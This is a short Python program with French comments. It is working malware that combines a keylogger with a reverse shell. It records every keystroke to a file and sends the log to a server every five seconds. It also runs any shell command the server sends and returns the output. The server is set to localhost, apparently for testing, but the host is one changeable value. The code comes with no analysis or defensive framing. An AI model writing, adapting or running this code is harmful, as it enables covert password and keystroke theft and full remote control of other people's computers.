import socket
import subprocess
import threading
import time
from pynput import keyboard

ip_address = '127.0.0.1'
port_number = 1234
keylog_file = "keylog.txt"

def start_keylogger():
    def on_press(key):
        try:
            with open(keylog_file, "a") as file:
                file.write(f"{key.char}")
        except AttributeError:  # Pour les touches spéciales
            with open(keylog_file, "a") as file:
                file.write(f" [{key}] ")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def send_keylog_periodically(cs):
    while True:
        try:
            time.sleep(5)
            with open(keylog_file, "r") as file:
                key_data = file.read()
            if key_data:
                cs.send(f"[Keylog]:\n{key_data}".encode())
                open(keylog_file, "w").close()
        except Exception as e:
            cs.send(f"Error reading keylog: {e}".encode())
            break

def connect_to_server():
    cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cs.connect((ip_address, port_number))
    print("Connecté au serveur :)")

    threading.Thread(target=start_keylogger, daemon=True).start()

    threading.Thread(target=send_keylog_periodically, args=(cs,), daemon=True).start()

    while True:
        try:
            command = cs.recv(1024).decode()
            if command.lower() == 'quit':
                break
            else:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout + result.stderr
                if not output:
                    output = "Commande exécutée, pas de sortie !."
                cs.send(output.encode())
        except Exception as e:
            cs.send(f"Error: {e}".encode())
            break

    cs.close()

if __name__ == "__main__":
    connect_to_server()
